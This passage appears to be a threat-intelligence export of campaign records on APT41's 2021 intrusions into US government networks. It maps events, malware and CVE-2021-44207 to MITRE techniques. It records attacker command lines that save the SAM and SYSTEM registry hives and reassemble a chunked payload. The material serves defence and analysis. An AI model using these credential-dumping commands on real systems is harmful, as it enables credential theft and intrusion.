'Creating a file', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}, {'type': 'attack-pattern', 'id': 'attack-pattern--42d4b769-2156-5559-8b39-a0805b15c404', 'name': 'Datamine Active Directory data', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'DSQUERY Payload Dropped', 'analyst_brief': 'APT41 dropped a DSQUERY payload, a utility that they used to query Active Directory'},<br/>{'name': 'Host Command', 'description': 'Key Host Command', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-10-17T00:00:00.000Z', 'attributions': {'releasable': True, 'host_commands': [{'type': 'hostcmd', 'id': 'hostcmd--31238d48-a260-5cff-87b0-297e4f3d4607', 'attribution_scope': 'confirmed', 'releasable': True, 'command_line': 'reg  save hklm\\\\system  C:\\\\ProgramData\\\\SYSTEM'}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--75ba9f27-fff1-57ed-83d2-f80d4c9827fb', 'name': 'Datamine Windows registry', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896', 'name': 'Query Registry', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1012', 'tactics': ['Discovery']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Registry Hive Saved', 'analyst_brief': 'Using the built-in "reg" command APT41 dumped the SYSTEM Registry Hive to disk.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-10-17T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--e5b09a51-15f3-57a8-ae58-4718f4992ef6', 'name': 'Full Path: C:\\ProgramData\\b.exe', 'attribution_scope': 'confirmed', 'releasable': True}], 'malware': [{'type': 'malware', 'id': 'malware--8e99e597-dda4-57dc-be6e-f1bc8b80a5f3', 'name': 'BADPOTATO', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--07cf4702-f617-5e55-a0b5-6b7a3d808eb3', 'name': 'Arbitrary payload execution using msiexec', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--457c7820-d331-465a-915e-42f85500ccc4', 'name': 'System Binary Proxy Execution', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1218', 'tactics': ['Defense Evasion']}, {'type': 'attack-pattern', 'id': 'attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336', 'name': 'Msiexec', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1218.007', 'tactics': ['Defense Evasion']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--e1f4a21b-4d2f-5096-aa85-6fed53cc061c', 'name': 'Creating a file', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'BADPOTATO Dropped', 'analyst_brief': 'BADPOTATO sample was created on an exploited server in the same generic path at a second affected organization during this phase of the Campaign.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-06-14T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--ff7dfacf-9e59-5869-852f-0662ba5e9c9d', 'name': 'Full Path: C:\\ProgramData\\1.bat', 'attribution_scope': 'confirmed', 'releasable': True}], 'tools': [{'type': 'malware', 'id': 'malware--fed3481f-0095-53f2-8c32-7e286013233b', 'name': 'DSQUERY', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--97660fac-6d79-5269-a483-865d64b17dc3', 'name': 'Lateral Movement', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}, {'type': 'attack-pattern', 'id': 'attack-pattern--e1f4a21b-4d2f-5096-aa85-6fed53cc061c', 'name': 'Creating a file', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}, {'type': 'attack-pattern', 'id': 'attack-pattern--42d4b769-2156-5559-8b39-a0805b15c404', 'name': 'Datamine Active Directory data', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Launcher Batch Script Dropped', 'analyst_brief': 'APT41 leveraged a batch script to launch DSQUERY'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-02T00:00:00.000Z', 'attributions': {'releasable': True, 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--8154ff97-5013-5fbe-815f-2b4ae13c734a', 'name': 'Malicious use of HTTP', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161', 'name': 'Web Protocols', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1071.001', 'tactics': ['Command and Control']}, {'type': 'attack-pattern', 'id': 'attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6', 'name': 'Application Layer Protocol', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1071', 'tactics': ['Command and Control']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--926c0c9e-3dfe-54d9-8246-89c2c5315b4b', 'name': 'Exploitation of Microsoft products', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c', 'name': 'Exploit Public-Facing Application', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1190', 'tactics': ['Initial Access']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': '.NET Web Application Exploited', 'analyst_brief': 'An HTTP POST request was sent to a public-facing web server vulnerable to a .NET Deserialization Vulnerability. This was the first evidence we obtained observing APT41 exploiting one of these .NET servers in this way.'},<br/>{'name': 'Malicious Executable', 'description': 'Malicious Executable Compiled', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-04-02T00:00:00.000Z', 'attributions': {'releasable': True, 'malware': [{'type': 'malware', 'id': 'malware--4484e24c-fbf7-5894-90e2-4c6ed949ec6c', 'name': 'KEYPLUG', 'attribution_scope': 'confirmed', 'releasable': True}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}},<br/>{'name': 'Host Command', 'description': 'Key Host Command', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-10-17T00:00:00.000Z', 'attributions': {'releasable': True, 'host_commands': [{'type': 'hostcmd', 'id': 'hostcmd--bc41bcd2-19f4-50de-9aee-5aae801c153f', 'attribution_scope': 'confirmed', 'releasable': True, 'command_line': 'reg  save hklm\\\\sam  C:\\\\ProgramData\\\\SAM'}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--75ba9f27-fff1-57ed-83d2-f80d4c9827fb', 'name': 'Datamine Windows registry', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896', 'name': 'Query Registry', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1012', 'tactics': ['Discovery']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--78fc9e88-2580-5808-83af-e81b24db98bb', 'name': 'Credential theft from Security Accounts Manager (SAM) database', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011', 'name': 'Security Account Manager', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1003.002', 'tactics': ['Credential Access']}, {'type': 'attack-pattern', 'id': 'attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22', 'name': 'OS Credential Dumping', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1003', 'tactics': ['Credential Access']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Registry Hive Saved', 'analyst_brief': 'Using the built-in "reg" command APT41 dumped the SAM Registry Hive to disk.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-10-17T00:00:00.000Z', 'attributions': {'releasable': True, 'vulnerabilities': [{'type': 'vulnerability', 'id': 'vulnerability--362764b4-aa15-55fd-a68b-caf84f25a6b0', 'attribution_scope': 'confirmed', 'releasable': True, 'cve_id': 'CVE-2021-44207'}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--8154ff97-5013-5fbe-815f-2b4ae13c734a', 'name': 'Malicious use of HTTP', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161', 'name': 'Web Protocols', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1071.001', 'tactics': ['Command and Control']}, {'type': 'attack-pattern', 'id': 'attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6', 'name': 'Application Layer Protocol', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1071', 'tactics': ['Command and Control']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--926c0c9e-3dfe-54d9-8246-89c2c5315b4b', 'name': 'Exploitation of Microsoft products', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c', 'name': 'Exploit Public-Facing Application', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1190', 'tactics': ['Initial Access']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'USAHerds .NET Web Application Exploited', 'analyst_brief': 'Following their eradication from the targeted environment in July 2021, APT41 re-exploited the USAHERDS CVE-2021-44207 vulnerability that remained present on targeted servers at multiple organizations.'},<br/>{'name': 'Host Command', 'description': 'Key Host Command', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-06-14T00:00:00.000Z', 'attributions': {'releasable': True, 'host_commands': [{'type': 'hostcmd', 'id': 'hostcmd--7f57b538-6199-59bc-a247-d86230d741a5', 'attribution_scope': 'confirmed', 'releasable': True, 'command_line': '"cmd" /c copy /y /b C:\\Users\\public\\syslog_6-*.dat C:\\Users\\public\\syslog.dll'}], 'malware': [{'type': 'malware', 'id': 'malware--0514a150-7c5a-512f-bec2-8aa51cbcb8b1', 'name': 'DEADEYE', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--1db022eb-6865-5310-bc8b-abd9a44dd9c0', 'name': 'Copying a file', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Payload Copied', 'analyst_brief': 'Using a data-chunking technique to evade detection, multiple files making up a payload were separately dropped and then reassembled on-disk.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-06-14T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--52d570a1-329a-5efe-9b32-ddaf8f0a3ceb', 'name': 'Process: findstr.exe \| Parent Path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \| User: IIS APPPOOL\\<REDACTED>', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--703b08e4-735b-5c95-9ea9-6568a1589a59', 'name': 'Exploit Operations', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c', 'name': 'Exploit Public-Facing Application', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1190', 'tactics': ['Initial Access']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--3dd7ce5c-c319-5586-8f1d-0d8e58f0b45b', 'name': 'Host Search', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': '.NET Web Application Exploited', 'analyst_brief': 'APT41 exploited a new, custom .NET Web Application specific to this target organization. While Mandiant did not directly observe the exploitation attempts on the network, basic reconnaissance was conducted using PowerShell via these exploit payloads. The parent process of the PowerShell commands was the IIS Worker Process, "w3wp.exe", and were executed under the context of the user account associated with this custom application.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-05T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--bc67c7a6-e732-5ca6-b674-0061c86c1cce', 'name': 'FileItem:Created Modified Accessed Changed FilenameCreated FilenameModified FilenameAccessed FilenameChanged \| D:\\inetpub\\wwwroot\\<REDACTED>\\bin\\<REDACTED>.cab', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--46ed8959-571d-58c4-a934-891850964ba8', 'name': 'Remote Staging Directory', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e', 'name': 'Data Staged', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1074', 'tactics': ['Collection']}, {'type': 'attack-pattern', 'id': 'attack-pattern--359b00ad-9425-420b-bba5-6de8d600cbc0', 'name': 'Remote Data Staging', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1074.002', 'tactics': ['Collection']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--93424373-88cb-5563-82d2-03a53fbfecfc', 'name': 'Use of Cabinet (CAB) archive', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}, {'type': 'attack-pattern', 'id': 'attack-pattern--1a0c3769-c5c9-5d94-8273-f638c4ed72ec', 'name': 'Exfiltration over web service', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--40597f16-0963-4249-bf4c-ac93b7fb9807', 'name': 'Exfiltration Over Web Service', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1567', 'tactics': ['Exfiltration']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Archived Data', 'analyst_brief': "A Cabinet archive file was created within the server's web directory, presumably for exfiltration. This .cab file contained the previously dumped SYSTEM Registry Hive."},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-06-14T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--3e5d4282-2cf2-5ca6-bc30-3829e99ea092', 'name': 'Full Path: C:\\ProgramData\\7.txt', 'attribution_scope': 'confirmed', 'releasable': True}], 'tools': [{'type': 'malware', 'id': 'malware--fed3481f-0095-53f2-8c32-7e286013233b', 'name': 'DSQUERY', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--97660fac-6d79-5269-a483-865d64b17dc3', 'name': 'Lateral Movement', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}, {'type': 'attack-pattern', 'id': 'attack-pattern--e1f4a21b-4d2f-5096-aa85-6fed53cc061c', 'name': 'Creating a file', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}, {'type': 'attack-pattern', 'id': 'attack-pattern--42d4b769-2156-5559-8b39-a0805b15c404', 'name': 'Datamine Active Directory data', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Reconnaissance Data Output', 'analyst_brief': 'APT41 created a file with datamined Active Directory data for lateral movement'}<br/>aliases: {"releasable": true, "actor": [{"type": "alias", "id": "alias--c63f2b2b-3639-5bd0-be28-b1cb79b00b21", "name": "Barium (Microsoft)", "attribution_scope": "confirmed", "releasable": true, "source": "Microsoft", "nucleus_name": "Barium"}], "malware": [], "campaign": []}<br/>actors: {'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True, 'motivations': [{'type': 'motivation', 'id': 'motivation--fa4d4992-1762-50ac-b0b1-2c75210645d0', 'name': 'Financial Gain', 'attribution_scope': 'confirmed', 'releasable': True}, {'type': 'motivation', 'id': 'motivation--1b8ca82a-7cff-5622-bedd-965c11d38a9e', 'name': 'Espionage', 'attribution_scope': 'confirmed', 'releasable': True}], 'source_locations': [{'releasable': True, 'country': {'type': 'location', 'id': 'location--740e7e5f-f2a0-55e0-98a3-88872c55b581', 'name': 'China', 'attribution_scope': 'confirmed', 'releasable': True, 'iso2': 'CN'}, 'region': {'type': 'location', 'id': 'location--8fc231f3-4e62-57e7-b734-eaee0a734612', 'name': 'Asia', 'attribution_scope': 'confirmed', 'releasable': True}, 'sub_region': {'type': 'location', 'id': 'location--7b33370b-da4b-5c48-9741-b69f69febb77', 'name': 'East Asia', 'attribution_scope': 'confirmed', 'releasable': True}}]}<br/>malware: {'type': 'malware', 'id': 'malware--448e822d-8496-5021-88cb-599062f74176', 'name': 'BEACON', 'attribution_scope': 'confirmed', 'releasable': True},<br/>{'type': 'malware', 'id': 'malware--ad51977a-c6fc-5cd3-822e-4e2aa6c832a2', 'name': 'FASTPACE', 'attribution_scope': 'confirmed', 'releasable': True}<br/>vulnerabilities: {'type': 'vulnerability', 'id': 'vulnerability--362764b4-aa15-55fd-a68b-caf84f25a6b0', 'attribution_scope': 'confirmed', 'releasable': True, 'cve_id': 'CVE-2021-44207'}<br/>industries: {'type': 'identity', 'id': 'identity--8d0881d8-d199-5e5a-bef9-be3ca6bb8f0d', 'name': 'Governments', 'attribution_scope': 'confirmed', 'releasable': True}<br/>target_locations: {"releasable": true, "countries": [{"type": "location", "id": "location--5c5b39aa-9308-52a6-9daf-0547d5aaa160", "name": "United States of America", "attribution_scope": "confirmed", "iso2": "US", "region": "location--6d65522f-0166-5e7e-973c-35cf7973e4e3", "sub_region": "location--0daadcfb-ad23-5f16-b53b-6c5b09bf20de", "releasable": true, "count": 8}], "regions": [{"type": "location", "id": "location--6d65522f-0166-5e7e-973c-35cf7973e4e3", "name": "Americas", "attribution_scope": "confirmed", "releasable": true, "count": 8}], "sub_regions": [{"type": "location", "id": "location--0daadcfb-ad23-5f16-b53b-6c5b09bf20de", "name": "North America", "attribution_scope": "confirmed", "region": "location--6d65522f-0166-5e7e-973c-35cf7973e4e3", "releasable": true, "count": 8}]}<br/>is_publishable: true | {'name': 'related-to', 'reverseName': 'related-to', 'type': 'IndicatorToIndicator', 'entityA': 'CAMP.21.014', 'entityAFamily': 'Indicator', 'entityAType': 'Campaign', 'entityB': 'APT41', 'entityBFamily': 'Indicator', 'entityBType': 'Threat Actor', 'fields': {}},<br/>{'name': 'related-to', 'reverseName': 'related-to', 'type': 'IndicatorToIndicator', 'entityA': 'CAMP.21.014', 'entityAFamily': 'Indicator', 'entityAType': 'Campaign', 'entityB': 'BEACON', 'entityBFamily': 'Indicator', 'entityBType': 'Malware', 'fields': {}} | Campaign | CAMP.21.014 |

